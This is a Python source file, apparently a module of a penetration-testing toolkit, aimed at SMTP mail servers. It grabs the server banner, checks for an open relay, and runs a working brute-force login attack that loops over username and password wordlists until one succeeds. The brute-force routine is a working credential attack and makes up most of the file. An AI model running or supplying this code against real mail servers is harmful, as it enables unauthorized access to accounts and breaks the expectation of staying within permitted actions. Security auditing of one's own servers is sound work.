import os
import smtplib
from socket import socket, AF_INET, SOCK_STREAM


def banner_grab_smtp(ip, port):
    # Grab the SMTP banner to check the version
    try:
        sock = socket(AF_INET, SOCK_STREAM)
        sock.connect((ip, port))
        banner = sock.recv(1024).decode()
        sock.close()
        print(f"SMTP Banner on port {port}: {banner}")
        return banner
    except Exception as e:
        print(f"Failed to grab SMTP banner: {e}")
        return None

def check_open_relay(ip, port):
    # Check if the SMTP server is an open relay (allows unauthenticated email sending)
    try:
        with smtplib.SMTP(ip, port) as server:
            server.ehlo()
            response = server.docmd("MAIL FROM:<test@test.com>")
            response2 = server.docmd("RCPT TO:<victim@target.com>")
            if response[0] == 250 and response2[0] == 250:
                print("Warning: Open relay detected!")
            else:
                print("SMTP server is not an open relay.")
    except Exception as e:
        print(f"Open relay test failed: {e}")

def brute_force_smtp(ip, port, username_file, password_file):
    # Brute-force login attempts using smtplib
    print(f"Starting brute force attack on SMTP server at {ip}:{port}...")
    with open(username_file, 'r') as uf, open(password_file, 'r') as pf:
        usernames = [line.strip() for line in uf]
        passwords = [line.strip() for line in pf]

    for username in usernames:
        for password in passwords:
            try:
                print(f"Trying {username}:{password}...")
                with smtplib.SMTP(ip, port) as server:
                    server.ehlo()
                    server.login(username, password)
                    print(f"Login successful with {username}:{password}")
                    return True
            except smtplib.SMTPAuthenticationError:
                # Login failed, continue trying
                pass
            except Exception as e:
                print(f"Error occurred during brute-force attempt: {e}")
                return False
    print("Brute-force attack finished, no valid credentials found.")
    return False

def smtp_info(ip,port):
    # Gather IP and scan for SMTP vulnerabilities
    
    if True:
        # Grab the SMTP banner
        banner_grab_smtp(ip, port)
        
        # Check for open relay vulnerability
        check_open_relay(ip, port)
        
        # Brute force login attempt
        username_file = 'usernames.txt'
        password_file = 'passwords.txt'
        brute_force_smtp(ip, port, username_file, password_file)
    else:
        print("SMTP service not detected or ports 25, 465, and 587 are closed.")


def smtp(target,p,v):
    smtp_info(target,p)
    print('coming soon...')